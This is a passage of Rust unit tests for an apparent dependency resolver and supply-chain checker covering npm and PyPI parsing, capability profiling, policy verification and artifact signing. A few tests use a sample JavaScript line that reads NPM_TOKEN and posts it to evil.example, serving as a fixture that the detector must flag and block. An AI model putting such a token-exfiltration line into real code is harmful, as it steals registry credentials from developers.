            dir.path().join("pyproject.toml"),
            r#"
            [tool.poetry.dependencies]
            python = "^3.11"
            idna = "^3.0"
            "#,
        )
        .unwrap();
        fs::write(
            dir.path().join("poetry.lock"),
            r#"
            [[package]]
            name = "idna"
            version = "3.7"
            files = [
                {file = "idna-3.7-py3-none-any.whl", hash = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
            ]
            "#,
        )
        .unwrap();

        let requirements = discover_project_requirements(dir.path()).unwrap();
        assert!(requirements
            .specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some(">=3.0,<4")));
        assert_eq!(
            requirements
                .constraints
                .get("pypi:idna")
                .map(String::as_str),
            Some("3.7")
        );
        assert_eq!(
            requirements
                .hashes
                .get("pypi:idna")
                .and_then(|hashes| hashes.iter().next())
                .map(String::as_str),
            Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
        );
    }

    #[test]
    fn parses_pypi_requires_dist_with_extras() {
        let spec = parse_pypi_requirement("urllib3<3,>=1.21.1").unwrap();
        assert_eq!(spec.name, "urllib3");
        assert_eq!(spec.version.as_deref(), Some("<3,>=1.21.1"));

        assert!(parse_pypi_requirement("PySocks>=1.5.6; extra == 'socks'").is_none());

        let extras = BTreeSet::from(["socks".to_owned()]);
        let spec = parse_pypi_requirement_with_extras("PySocks>=1.5.6; extra == 'socks'", &extras)
            .unwrap();
        assert_eq!(spec.name, "pysocks");
        assert_eq!(spec.version.as_deref(), Some(">=1.5.6"));
    }

    #[test]
    fn reads_pypi_sdist_metadata_dependencies() {
        let bytes = python_sdist_for_test(&[(
            "PKG-INFO",
            "Metadata-Version: 2.1\nName: pure-sdist\nVersion: 1.0.0\nRequires-Dist: idna>=3\nRequires-Dist: PySocks>=1.5.6; extra == 'socks'\n",
        )]);

        let dependencies = pypi_sdist_dependencies(
            &bytes,
            "pure-sdist-1.0.0.tar.gz",
            &BTreeSet::from(["socks".to_owned()]),
        )
        .unwrap();
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "idna"
                && dependency.spec.version.as_deref() == Some(">=3")));
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "pysocks"
                && dependency.spec.version.as_deref() == Some(">=1.5.6")));

        let bytes = python_zip_sdist_for_test(&[(
            "PKG-INFO",
            "Metadata-Version: 2.1\nName: pure-sdist\nVersion: 1.0.0\nRequires-Dist: idna>=3\nRequires-Dist: PySocks>=1.5.6; extra == 'socks'\n",
        )]);
        let dependencies = pypi_sdist_dependencies(
            &bytes,
            "pure-sdist-1.0.0.zip",
            &BTreeSet::from(["socks".to_owned()]),
        )
        .unwrap();
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "idna"
                && dependency.spec.version.as_deref() == Some(">=3")));
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "pysocks"
                && dependency.spec.version.as_deref() == Some(">=1.5.6")));
    }

    #[test]
    fn merges_pypi_constraints_into_requirements() {
        let spec = PackageSpec::new(Ecosystem::Pypi, "urllib3", Some("<3,>=1.21.1".to_owned()));
        let constraints = BTreeMap::from([("pypi:urllib3".to_owned(), "==2.2.1".to_owned())]);
        assert_eq!(
            constrained_pypi_requirement(&spec, &constraints).as_deref(),
            Some("<3,>=1.21.1,==2.2.1")
        );
    }

    #[test]
    fn evaluates_common_pypi_markers() {
        let env = PypiMarkerEnvironment {
            python_full_version: Some("3.11.4".to_owned()),
            os_name: "posix".to_owned(),
            sys_platform: "darwin".to_owned(),
            platform_system: "Darwin".to_owned(),
            platform_machine: "arm64".to_owned(),
            implementation_name: "cpython".to_owned(),
            platform_python_implementation: "CPython".to_owned(),
            extra: String::new(),
        };

        assert_eq!(
            evaluate_pypi_marker("python_version >= '3.0'", &env),
            Some(true)
        );
        assert_eq!(
            evaluate_pypi_marker("python_version < '0'", &env),
            Some(false)
        );
        assert_eq!(
            evaluate_pypi_marker("os_name == 'posix' or python_version < '0'", &env),
            Some(true)
        );
        assert_eq!(
            evaluate_pypi_marker("os_name == 'nt' and python_version >= '3.0'", &env),
            Some(false)
        );
    }

    #[test]
    fn parses_requirement_continuations_and_hash_options() {
        let lines = requirement_logical_lines(
            "idna==3.7 \\\n  --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \\\n  --hash sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n",
        );
        assert_eq!(lines.len(), 1);

        let parsed = parse_requirement_line(&lines[0]);
        assert_eq!(parsed.requirement, "idna==3.7");
        assert!(parsed
            .hashes
            .contains("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"));
        assert!(parsed
            .hashes
            .contains("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"));
    }

    #[test]
    fn applies_requires_python_constraints() {
        let file = PypiFile {
            filename: "pkg-1.0.0-py3-none-any.whl".to_owned(),
            packagetype: "bdist_wheel".to_owned(),
            url: "https://example.invalid/pkg.whl".to_owned(),
            digests: PypiDigests {
                sha256: "abc".to_owned(),
            },
            requires_python: Some(">=3.10".to_owned()),
        };
        assert!(!pypi_file_python_compatible(&file, Some("3.9.6")));
        assert!(pypi_file_python_compatible(&file, Some("3.11.0")));
    }

    #[test]
    fn chooses_pypi_source_distributions_when_no_wheel_exists() {
        let doc = PypiResponse {
            info: PypiInfo {
                name: "source-only".to_owned(),
                version: "1.0.0".to_owned(),
                requires_dist: None,
            },
            urls: vec![PypiFile {
                filename: "source-only-1.0.0.zip".to_owned(),
                packagetype: "sdist".to_owned(),
                url: "https://example.invalid/source-only-1.0.0.zip".to_owned(),
                digests: PypiDigests {
                    sha256: "abc".to_owned(),
                },
                requires_python: None,
            }],
        };

        let file = choose_pypi_file(&doc, Some("3.11.0")).unwrap();
        assert_eq!(file.filename, "source-only-1.0.0.zip");
    }

    #[test]
    fn checks_wheel_tags_against_python_platform() {
        let compatibility = PythonWheelCompatibility::new(
            3,
            9,
            "cpython",
            "cpython-39",
            "macosx_10_9_universal2",
            "arm64",
            "14.0.0",
        );

        assert!(wheel_tag_compatible(
            "idna-3.7-py3-none-any.whl",
            &compatibility
        ));
        assert!(wheel_tag_compatible(
            "orjson-3.10.18-cp39-cp39-macosx_10_15_x86_64.macosx_11_0_arm64.macosx_10_15_universal2.whl",
            &compatibility
        ));
        assert!(!wheel_tag_compatible(
            "orjson-3.10.18-cp310-cp310-macosx_11_0_arm64.whl",
            &compatibility
        ));
        assert!(!wheel_tag_compatible(
            "orjson-3.10.18-cp39-cp39-win_amd64.whl",
            &compatibility
        ));
    }

    #[test]
    fn profiler_turns_host_access_into_capabilities() {
        let mut profiler = SourceProfiler::default();
        profiler.scan_file(
            "index.js",
            "const token = process.env.NPM_TOKEN; fetch('https://evil.example', { body: token });",
        );
        let profile = profiler.finish();
        assert!(profile.capabilities.iter().any(
            |finding| finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"
        ));
        assert!(profile
            .capabilities
            .iter()
            .any(|finding| finding.kind == CapabilityKind::HttpRequest
                && finding.target == "evil.example"));
    }

    #[test]
    fn generated_profile_module_models_static_env_to_network_flow() {
        let package = ResolvedPackage {
            ecosystem: Ecosystem::Npm,
            name: "date-helper".to_owned(),
            version: "1.2.4".to_owned(),
            source_url: "https://example.invalid/date-helper.tgz".to_owned(),
            download_url: None,
            local_path: None,
            filename: "date-helper.tgz".to_owned(),
            expected_sha256: None,
            expected_sha1: None,
            expected_integrity: None,
            npm_direct_tarball: false,
            pypi_direct_wheel: false,
            npm_scripts: BTreeMap::new(),
            platform_compatible: true,
            dependencies: Vec::new(),
        };
        let findings = vec![
            CapabilityFinding {
                kind: CapabilityKind::EnvRead,
                target: "NPM_TOKEN".to_owned(),
                source: "index.js".to_owned(),
                evidence: "static env read `NPM_TOKEN`".to_owned(),
            },
            CapabilityFinding {
                kind: CapabilityKind::HttpRequest,
                target: "evil.example".to_owned(),
                source: "index.js".to_owned(),
                evidence: "static URL host `evil.example`".to_owned(),
            },
        ];
        let module = module_from_profile(&package, &findings);
        let http = module.functions[0]
            .code
            .iter()
            .find_map(|op| match op {
                Op::Cap(CapOp::HttpRequest { request }) => Some(request),
                _ => None,
            })
            .unwrap();
        assert!(http.body_from_stack);

        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()));
        let error = verify_module(&module, &policy).unwrap_err();
        assert!(error.findings.iter().any(|finding| finding
            .message
            .contains("env:NPM_TOKEN may not flow to network:evil.example")));
    }

    #[test]
    fn profiler_ignores_tests_and_packaging_files() {
        let mut profiler = SourceProfiler::default();
        profiler.scan_file("pkg/tests/test_runtime.py", "open('/tmp/x', 'w')");
        profiler.scan_file("pkg/setup.py", "open('README.md').read()");
        let profile = profiler.finish();
        assert!(profile.capabilities.is_empty());
        assert_eq!(profile.files_scanned, 0);
    }

    #[test]
    fn parses_python_script_entry_points() {
        let entries = parse_python_entry_points(
            r#"
            [console_scripts]
            normalizer = charset_normalizer.cli.normalizer:cli_detect

            [gui_scripts]
            image-viewer = localpkg.gui:main
            "#,
        );
        assert_eq!(
            entries,
            vec![
                PythonEntryPoint {
                    name: "normalizer".to_owned(),
                    module: "charset_normalizer.cli.normalizer".to_owned(),
                    function: "cli_detect".to_owned(),
                },
                PythonEntryPoint {
                    name: "image-viewer".to_owned(),
                    module: "localpkg.gui".to_owned(),
                    function: "main".to_owned(),
                }
            ]
        );
    }

    #[test]
    fn python_entry_points_strip_global_site_packages() {
        let script = python_entry_point_script(&PythonEntryPoint {
            name: "normalizer".to_owned(),
            module: "charset_normalizer.cli.normalizer".to_owned(),
            function: "cli_detect".to_owned(),
        });

        assert!(script.contains("_python_dir / \"site-packages\""));
        assert!(script.contains("_python_dir / \"local-paths\""));
        assert!(script.contains("path not in _project_paths"));
        assert!(script.contains("\"site-packages\" not in path"));
        assert!(script.contains("\"dist-packages\" not in path"));
    }

    #[test]
    fn parses_capability_grants() {
        assert_eq!(
            parse_capability_grant("http:api.example.com").unwrap(),
            Capability::HttpHost("api.example.com".to_owned())
        );
        assert_eq!(
            parse_capability_grant("env:API_TOKEN").unwrap(),
            Capability::EnvRead("API_TOKEN".to_owned())
        );
        assert_eq!(
            parse_capability_grant("dynamic-eval").unwrap(),
            Capability::DynamicEval
        );
    }

    #[test]
    fn parses_npmrc_registry_and_auth_config() {
        let mut config = NpmConfig::default();
        parse_npmrc_content(
            r#"
            registry=https://registry.example.invalid/npm
            @scope:registry=https://scope.example.invalid/
            //scope.example.invalid/:_authToken=scope-token
            //registry.example.invalid/npm/:_authToken=default-token
            "#,
            &mut config,
        );

        assert_eq!(config.registry, "https://registry.example.invalid/npm/");
        assert_eq!(
            config.registry_for("left-pad"),
            "https://registry.example.invalid/npm/"
        );
        assert_eq!(
            config.registry_for("@scope/pkg"),
            "https://scope.example.invalid/"
        );
        assert_eq!(
            config.auth_token_for_url("https://scope.example.invalid/@scope%2fpkg"),
            Some("scope-token")
        );
        assert_eq!(
            config
                .auth_token_for_url("https://registry.example.invalid/npm/left-pad/-/left-pad.tgz"),
            Some("default-token")
        );
    }

    #[test]
    fn reads_manifest_policy_grants_and_pypi_indexes() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("omc.toml"),
            r#"
            [project]
            name = "policy-demo"
            version = "0.1.0"

            [policy]
            allow = ["http:api.example.com", "env:API_TOKEN"]

            [registries]
            pypi-index-url = "https://mirror.example/simple"
            pypi-extra-index-urls = ["https://extra.example/simple"]
            "#,
        )
        .unwrap();

        let options = options_with_manifest_policy(&LinkOptions::new(dir.path())).unwrap();
        assert!(options
            .allowed_capabilities
            .contains(&Capability::HttpHost("api.example.com".to_owned())));
        assert!(options
            .allowed_capabilities
            .contains(&Capability::EnvRead("API_TOKEN".to_owned())));
        assert_eq!(
            options.pypi_index_url.as_deref(),
            Some("https://mirror.example/simple/")
        );
        assert_eq!(
            options.pypi_extra_index_urls,
            vec!["https://extra.example/simple/".to_owned()]
        );
    }

    #[test]
    fn applies_pypi_environment_indexes() {
        let dir = tempfile::tempdir().unwrap();
        let mut options = LinkOptions::new(dir.path());
        apply_pypi_environment_values(
            &mut options,
            dir.path(),
            Some("https://env.example/simple"),
            Some("https://extra.example/simple 'https://quoted.example/simple' https://extra.example/simple"),
            Some("./wheelhouse https://files.example/packages"),
            true,
            true,
        );

        assert_eq!(
            options.pypi_index_url.as_deref(),
            Some("https://env.example/simple/")
        );
        assert_eq!(
            options.pypi_extra_index_urls,
            vec![
                "https://extra.example/simple/".to_owned(),
                "https://quoted.example/simple/".to_owned(),
            ]
        );
        assert_eq!(
            options.pypi_find_links,
            vec![
                dir.path()
                    .join(".")
                    .join("wheelhouse")
                    .to_string_lossy()
                    .into_owned(),
                "https://files.example/packages".to_owned(),
            ]
        );
        assert!(options.pypi_no_index);

        apply_pypi_environment_values(
            &mut options,
            dir.path(),
            Some("https://ignored.example/simple"),
            Some("https://another.example/simple"),
            Some("./wheelhouse"),
            false,
            false,
        );
        assert_eq!(
            options.pypi_index_url.as_deref(),
            Some("https://env.example/simple/")
        );
        assert_eq!(
            options.pypi_extra_index_urls,
            vec![
                "https://extra.example/simple/".to_owned(),
                "https://quoted.example/simple/".to_owned(),
                "https://another.example/simple/".to_owned(),
            ]
        );

        let mut options = LinkOptions::new(dir.path());
        options.pypi_index_url = Some("https://pip-config.example/simple/".to_owned());
        apply_pypi_environment_values(&mut options, dir.path(), None, None, None, false, true);
        assert_eq!(
            options.pypi_index_url.as_deref(),
            Some("https://pip-config.example/simple/")
        );
        apply_pypi_environment_values(
            &mut options,
            dir.path(),
            Some("https://env-override.example/simple"),
            None,
            None,
            false,
            true,
        );
        assert_eq!(
            options.pypi_index_url.as_deref(),
            Some("https://env-override.example/simple/")
        );
    }

    #[test]
    fn parses_pip_config_indexes() {
        let dir = tempfile::tempdir().unwrap();
        let mut config = PipConfig::default();
        parse_pip_config_content(
            r#"
            [global]
            index-url = https://global.example/simple
            extra-index-url = https://extra.example/simple 'https://quoted.example/simple'
            find-links = ./wheelhouse

            [install]
            extra-index-url =
                https://install-extra.example/simple
                https://extra.example/simple
            find-links =
                https://files.example/packages
                ./wheelhouse
            no-index = true

            [download]
            index-url = https://ignored.example/simple
            "#,
            dir.path(),
            &mut config,
        );

        assert_eq!(
            config.index_url.as_deref(),
            Some("https://global.example/simple/")
        );
        assert_eq!(
            config.extra_index_urls,
            vec![
                "https://extra.example/simple/".to_owned(),
                "https://quoted.example/simple/".to_owned(),
                "https://install-extra.example/simple/".to_owned(),
            ]
        );
        assert_eq!(
            config.find_links,
            vec![
                dir.path()
                    .join(".")
                    .join("wheelhouse")
                    .to_string_lossy()
                    .into_owned(),
                "https://files.example/packages".to_owned(),
            ]
        );
        assert!(config.no_index);
    }

    #[test]
    fn generated_profile_module_rejects_capabilities_by_default() {
        let package = ResolvedPackage {
            ecosystem: Ecosystem::Npm,
            name: "date-helper".to_owned(),
            version: "1.2.4".to_owned(),
            source_url: "https://example.invalid/date-helper.tgz".to_owned(),
            download_url: None,
            local_path: None,
            filename: "date-helper.tgz".to_owned(),
            expected_sha256: None,
            expected_sha1: None,
            expected_integrity: None,
            npm_direct_tarball: false,
            pypi_direct_wheel: false,
            npm_scripts: BTreeMap::new(),
            platform_compatible: true,
            dependencies: Vec::new(),
        };
        let findings = vec![CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "index.js".to_owned(),
            evidence: "process.env".to_owned(),
        }];
        let module = module_from_profile(&package, &findings);
        let error = verify_module(&module, &Policy::pure()).unwrap_err();
        assert!(error
            .findings
            .iter()
            .any(|finding| finding.message.contains("env.read:NPM_TOKEN not granted")));
    }

    #[test]
    fn artifact_serializes_generated_microcode() {
        let package = ResolvedPackage {
            ecosystem: Ecosystem::Npm,
            name: "date-helper".to_owned(),
            version: "1.2.4".to_owned(),
            source_url: "https://example.invalid/date-helper.tgz".to_owned(),
            download_url: None,
            local_path: None,
            filename: "date-helper.tgz".to_owned(),
            expected_sha256: None,
            expected_sha1: None,
            expected_integrity: None,
            npm_direct_tarball: false,
            pypi_direct_wheel: false,
            npm_scripts: BTreeMap::new(),
            platform_compatible: true,
            dependencies: Vec::new(),
        };
        let findings = vec![CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "index.js".to_owned(),
            evidence: "process.env".to_owned(),
        }];
        let artifact = OmcArtifact {
            schema: ARTIFACT_SCHEMA,
            package: ArtifactPackage {
                ecosystem: package.ecosystem,
                name: package.name.clone(),
                version: package.version.clone(),
            },
            source_url: package.source_url.clone(),
            source_sha256: "0".repeat(64),
            compiler: "test".to_owned(),
            microcode: module_from_profile(&package, &findings),
            behavior: Behavior::HostCapability,
            verdict: Verdict::Blocked,
            grants: Vec::new(),
            dependencies: Vec::new(),
            optional_dependencies: Vec::new(),
            files_scanned: 1,
            capabilities: findings,
            verifier_findings: vec!["denied".to_owned()],
            signature: None,
        };

        let json = serde_json::to_string(&artifact).unwrap();

        assert!(json.contains("\"microcode\""));
        assert!(json.contains("\"op\":\"cap\""));
        let decoded: OmcArtifact = serde_json::from_str(&json).unwrap();
        assert_eq!(decoded.microcode.package, "date-helper");
        assert!(matches!(
            decoded.microcode.functions[0].code[0],
            Op::Cap(CapOp::EnvRead { .. })
        ));
    }

    #[test]
    fn signs_and_verifies_artifact_payloads() {
        let dir = tempfile::tempdir().unwrap();
        let package = ResolvedPackage {
            ecosystem: Ecosystem::Npm,
            name: "signed-pkg".to_owned(),
            version: "1.0.0".to_owned(),
            source_url: "https://example.invalid/signed-pkg.tgz".to_owned(),
            download_url: None,
            local_path: None,
            filename: "signed-pkg.tgz".to_owned(),
            expected_sha256: None,
            expected_sha1: None,
            expected_integrity: None,
            npm_direct_tarball: false,
            pypi_direct_wheel: false,
            npm_scripts: BTreeMap::new(),
            platform_compatible: true,
            dependencies: Vec::new(),
        };
        let mut artifact = OmcArtifact {
            schema: ARTIFACT_SCHEMA,
            package: ArtifactPackage {
                ecosystem: package.ecosystem,
                name: package.name.clone(),
                version: package.version.clone(),
            },
            source_url: package.source_url.clone(),
            source_sha256: "0".repeat(64),
            compiler: "test".to_owned(),
            microcode: module_from_profile(&package, &[]),
            behavior: Behavior::Pure,
            verdict: Verdict::Accepted,
            grants: Vec::new(),
            dependencies: Vec::new(),
            optional_dependencies: Vec::new(),
            files_scanned: 0,
            capabilities: Vec::new(),
            verifier_findings: Vec::new(),
            signature: None,
        };

        sign_artifact(dir.path(), &mut artifact).unwrap();

        let signature = artifact.signature.as_ref().unwrap();
        assert_eq!(signature.algorithm, "ed25519");
        assert!(dir.path().join(".omc/keys/artifact-ed25519.key").exists());
        verify_artifact_signature(&artifact).unwrap();

        artifact.source_sha256 = "1".repeat(64);
        assert!(matches!(
            verify_artifact_signature(&artifact).unwrap_err(),
            OmcRegistryError::DigestMismatch { .. }
        ));
    }

    #[test]
    fn install_lock_rejects_tampered_artifact_signature() {
        let dir = tempfile::tempdir().unwrap();
        let bytes = npm_tgz_for_test(
            r#"{
                "name": "pkg",
                "version": "1.0.0"
            }"#,
        );
        let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
        fs::create_dir_all(archive.parent().unwrap()).unwrap();
        fs::write(&archive, &bytes).unwrap();

        let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
        package.archive = relative_path(dir.path(), &archive);
        package.sha256 = sha256_hex(&bytes);
        write_signed_artifact_for_test(dir.path(), &package);

        let artifact_path = dir.path().join(&package.artifact);
        let mut artifact =
            serde_json::from_str::<OmcArtifact>(&fs::read_to_string(&artifact_path).unwrap())
                .unwrap();
        artifact.source_sha256 = "1".repeat(64);
        fs::write(
            &artifact_path,
            serde_json::to_string_pretty(&artifact).unwrap(),
        )
        .unwrap();

        let error = install_lock(
            dir.path(),
            &OmcLock {
                version: 1,
                packages: vec![package],
                python_vcs: Vec::new(),
            },
        )
        .unwrap_err();

        assert!(matches!(error, OmcRegistryError::DigestMismatch { .. }));
    }

    fn npm_tgz_for_test(package_json: &str) -> Vec<u8> {
        let mut bytes = Vec::new();
        {
            let encoder = flate2::write::GzEncoder::new(&mut bytes, flate2::Compression::default());
            let mut archive = tar::Builder::new(encoder);
            let mut metadata_header = tar::Header::new_gnu();
            metadata_header.set_size(0);
            metadata_header.set_mode(0o644);
            metadata_header.set_cksum();
            archive
                .append_data(&mut metadata_header, "._pure-sdist-1.0.0", std::io::empty())
                .unwrap();

            let mut root_header = tar::Header::new_gnu();
            root_header.set_entry_type(tar::EntryType::Directory);
            root_header.set_size(0);
            root_header.set_mode(0o755);
            root_header.set_cksum();
            archive
                .append_data(&mut root_header, "package/", std::io::empty())
                .unwrap();

            let mut header = tar::Header::new_gnu();
            header.set_size(package_json.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            archive
                .append_data(&mut header, "package/package.json", package_json.as_bytes())
                .unwrap();
            let encoder = archive.into_inner().unwrap();
            encoder.finish().unwrap();
        }
        bytes
    }

    fn python_sdist_for_test(files: &[(&str, &str)]) -> Vec<u8> {
        let mut bytes = Vec::new();
        {
            let encoder = flate2::write::GzEncoder::new(&mut bytes, flate2::Compression::default());
            let mut archive = tar::Builder::new(encoder);
            let mut root_header = tar::Header::new_gnu();
            root_header.set_entry_type(tar::EntryType::Directory);
            root_header.set_size(0);
            root_header.set_mode(0o755);
            root_header.set_cksum();
            archive
                .append_data(&mut root_header, "pure-sdist-1.0.0/", std::io::empty())
                .unwrap();

            for (path, content) in files {
                let mut header = tar::Header::new_gnu();
                header.set_size(content.len() as u64);
                header.set_mode(0o644);
                header.set_cksum();
                archive
                    .append_data(
                        &mut header,
                        format!("pure-sdist-1.0.0/{path}"),
                        content.as_bytes(),
                    )
                    .unwrap();
            }

            let encoder = archive.into_inner().unwrap();
            encoder.finish().unwrap();
        }
        bytes
    }

    fn python_zip_sdist_for_test(files: &[(&str, &str)]) -> Vec<u8> {
        use std::io::Write as _;

        let cursor = Cursor::new(Vec::new());
        let mut archive = zip::ZipWriter::new(cursor);
        let options = zip::write::SimpleFileOptions::default();
        archive.add_directory("pure-sdist-1.0.0/", options).unwrap();
        archive.start_file("._pure-sdist-1.0.0", options).unwrap();
        archive.write_all(b"").unwrap();
        for (path, content) in files {
            archive
                .start_file(format!("pure-sdist-1.0.0/{path}"), options)
                .unwrap();
            archive.write_all(content.as_bytes()).unwrap();
        }
        archive.finish().unwrap().into_inner()
    }

    fn locked_package_for_test(ecosystem: Ecosystem, name: &str, version: &str) -> LockedPackage {
        LockedPackage {
            ecosystem,
            name: name.to_owned(),
            version: version.to_owned(),
            source_url: format!("https://example.invalid/{name}-{version}.tgz"),
            archive: format!(".omc/cache/{name}-{version}.tgz"),
            artifact: format!(".omc/artifacts/{name}-{version}/omc.json"),
            sha256: "0".repeat(64),
            behavior: Behavior::Pure,
            verdict: Verdict::Accepted,
            dependencies: Vec::new(),
            optional_dependencies: Vec::new(),
            grants: Vec::new(),
            capabilities: Vec::new(),
            verifier_findings: Vec::new(),
        }
    }

    fn write_signed_artifact_for_test(project_dir: &Path, package: &LockedPackage) {
        let resolved = ResolvedPackage {
            ecosystem: package.ecosystem,
            name: package.name.clone(),
            version: package.version.clone(),
            source_url: package.source_url.clone(),
            download_url: None,
            local_path: None,
            filename: Path::new(&package.archive)
                .file_name()
                .and_then(|name| name.to_str())
                .unwrap_or("package.tgz")
                .to_owned(),
            expected_sha256: None,
            expected_sha1: None,
            expected_integrity: None,
            npm_direct_tarball: package.ecosystem == Ecosystem::Npm,
            pypi_direct_wheel: false,
            npm_scripts: BTreeMap::new(),
            platform_compatible: true,
            dependencies: Vec::new(),
        };
        let mut artifact = OmcArtifact {
            schema: ARTIFACT_SCHEMA,
            package: ArtifactPackage {
                ecosystem: package.ecosystem,
                name: package.name.clone(),
                version: package.version.clone(),
            },
            source_url: package.source_url.clone(),
            source_sha256: package.sha256.clone(),
            compiler: "test".to_owned(),
            microcode: module_from_profile(&resolved, &package.capabilities),
            behavior: package.behavior,
            verdict: package.verdict,
            grants: package.grants.clone(),
            dependencies: package.dependencies.clone(),
            optional_dependencies: package.optional_dependencies.clone(),
            files_scanned: 0,
            capabilities: package.capabilities.clone(),
            verifier_findings: package.verifier_findings.clone(),
            signature: None,
        };
        sign_artifact(project_dir, &mut artifact).unwrap();

        let artifact_path = checked_join(project_dir, Path::new(&package.artifact)).unwrap();
        fs::create_dir_all(artifact_path.parent().unwrap()).unwrap();
        fs::write(
            &artifact_path,
            serde_json::to_string_pretty(&artifact).unwrap(),
        )
        .unwrap();
    }
}
